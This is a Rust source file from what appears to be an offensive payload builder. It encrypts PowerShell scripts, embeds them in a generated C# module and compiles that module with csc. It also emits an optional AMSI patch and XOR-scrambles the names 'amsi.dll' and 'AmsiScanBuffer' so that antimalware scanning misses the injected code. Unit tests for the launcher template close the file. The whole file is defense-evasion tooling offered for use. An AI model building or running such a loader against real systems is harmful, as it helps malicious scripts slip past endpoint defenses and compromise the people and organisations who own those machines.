/// One script to inject into the module, already encrypted by the packer.
pub struct EncryptedScript {
    /// Key (32 bytes) as lowercase hex.
    pub key_hex: String,
    /// Nonce (24 bytes) as lowercase hex.
    pub nonce_hex: String,
    /// Ciphertext + Poly1305 tag, as lowercase hex.
    pub cipher_hex: String,
}

/// Renders the C# module source for the given encrypted scripts.
///
/// `patch_amsi` emits the AMSI patch call (the module runs inside the operator's
/// `powershell.exe`, whose AMSI would otherwise scan the injected scripts).
pub fn render_module(scripts: &[EncryptedScript], patch_amsi: bool) -> String {
    let keys = hex_list(scripts.iter().map(|s| s.key_hex.as_str()));
    let nonces = hex_list(scripts.iter().map(|s| s.nonce_hex.as_str()));
    let payloads = hex_list(scripts.iter().map(|s| s.cipher_hex.as_str()));

    // A per-build XOR key scrambles the two AMSI names so neither reaches the
    // module's metadata in cleartext (the payloads are already ciphertext).
    let mut xor = [0u8; 16];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut xor);
    let amsi_dll = scramble("amsi.dll", &xor);
    let amsi_func = scramble("AmsiScanBuffer", &xor);

    let patch = if patch_amsi {
        "        PatchAmsi();"
    } else {
        "        // AMSI is left as-is: the plan declares no patch_amsi step."
    };

    MODULE_TEMPLATE
        .replace("$XOR_KEY$", &byte_list(&xor))
        .replace("$KEYS$", &keys)
        .replace("$NONCES$", &nonces)
        .replace("$PAYLOADS$", &payloads)
        .replace("$AMSI_DLL$", &byte_list(&amsi_dll))
        .replace("$AMSI_FUNC$", &byte_list(&amsi_func))
        .replace("$PATCH_AMSI$", patch)
}

/// `"a", "b"` from an iterator of hex strings.
fn hex_list<'a>(items: impl Iterator<Item = &'a str>) -> String {
    items
        .map(|item| format!("\"{item}\""))
        .collect::<Vec<_>>()
        .join(", ")
}

/// `0a, 1b, ...` from a byte slice (a C# `byte[]` initializer).
fn byte_list(bytes: &[u8]) -> String {
    bytes
        .iter()
        .map(|b| b.to_string())
        .collect::<Vec<_>>()
        .join(", ")
}

/// XORs `text` (ASCII) with `key`, cycling the key.
fn scramble(text: &str, key: &[u8]) -> Vec<u8> {
    text.as_bytes()
        .iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect()
}

/// Renders and compiles the PowerShell module, returning the assembly's bytes.
pub fn build_module(
    scripts: &[EncryptedScript],
    patch_amsi: bool,
    scratch: &Path,
    tag: &str,
) -> Result<Vec<u8>> {
    let csc = find_csc()?;
    let assembly = find_powershell_assembly()?;

    let module_path = scratch.join(format!("{tag}.cs"));
    let crypto_path = scratch.join(format!("{tag}_xchacha.cs"));
    let output_path = scratch.join(format!("{tag}.dll"));
    std::fs::write(&module_path, render_module(scripts, patch_amsi).as_bytes())?;
    std::fs::write(&crypto_path, XCHACHA_CS.as_bytes())?;

    let output = Command::new(&csc)
        .arg("/nologo")
        .arg("/target:library")
        .arg(format!("/out:{}", output_path.display()))
        .arg(format!("/reference:{}", assembly.display()))
        .arg("/reference:System.Numerics.dll")
        .arg(&module_path)
        .arg(&crypto_path)
        .output()
        .map_err(|error| {
            BuildError::DotnetCompilerNotFound(format!(
                "could not run '{}': {error}",
                csc.display()
            ))
        })?;

    if !output.status.success() {
        let mut detail = String::from_utf8_lossy(&output.stdout).into_owned();
        detail.push_str(&String::from_utf8_lossy(&output.stderr));
        return Err(BuildError::ManagedCompilationFailed(
            detail.trim().to_string(),
        ));
    }

    Ok(std::fs::read(&output_path)?)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_verbatim_literal_doubles_quotes_and_keeps_newlines() {
        let literal = csharp_verbatim("line1\nline2 with \"quotes\" and \\slashes");
        assert!(literal.starts_with("@\""));
        assert!(literal.ends_with('"'));
        // A verbatim string escapes a quote by doubling it.
        assert!(literal.contains("\"\"quotes\"\""));
        // Newlines and backslashes survive unchanged.
        assert!(literal.contains("\nline2"));
        assert!(literal.contains("\\slashes"));
    }

    #[test]
    fn render_launcher_bakes_script_command_and_flags() {
        let source = render_launcher("function F { 1 }", "F", false, false);
        assert!(source.contains("@\"function F { 1 }\""));
        assert!(source.contains("private const string Command = @\"F\";"));
        assert!(source.contains("private const bool JoinMode = false;"));
        assert!(source.contains("private const bool Interactive = false;"));
        // The AMSI-relevant hosting types are present in the generated C#.
        assert!(source.contains("System.Management.Automation"));
        assert!(source.contains("PowerShell.Create"));
        assert!(source.contains("RunspaceFactory.CreateRunspace"));
    }

    #[test]
    fn render_launcher_honours_only_the_selected_flags() {
        let source = render_launcher("", "", true, true);
        assert!(source.contains("private const bool JoinMode = true;"));
        assert!(source.contains("private const bool Interactive = true;"));
        assert!(source.contains("private const string Command = @\"\";"));
    }
}
